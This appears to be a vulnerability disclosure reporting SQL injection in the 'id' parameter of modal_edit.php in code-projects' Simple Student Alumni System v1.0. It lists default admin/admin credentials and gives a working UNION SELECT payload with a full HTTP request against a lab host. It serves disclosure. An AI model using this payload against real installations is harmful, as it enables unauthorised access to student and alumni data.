# Simple Student Alumni System v1.0 by code-projects has SQL injection 4

BUG_Author: Zhang Qi

Login account: admin/admin

vendors: https://code-projects.org/simple-student-alumni-system-in-php/

The program is built using the xmapp-php5.6 version

Vulnerability File: /TracerStudy/modal_edit.php

Vulnerability location: /TracerStudy/modal_edit.php?id=, id

dbname = tracerdata

[+] Payload: /TracerStudy/modal_edit.php?id=-1%20union%20select%201,2,database()--+ // Leak place ---> id

```sql
GET /TracerStudy/modal_edit.php?id=-1%20union%20select%201,2,database()--+ HTTP/1.1
Host: 192.168.1.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=g17ug0qq4g9bcjtuvmurka4g55
Connection: close
```
<img width="1287" height="780" alt="image" src="https://github.com/user-attachments/assets/3ade8c2f-dfc9-4250-b118-fb01d306c82f" />

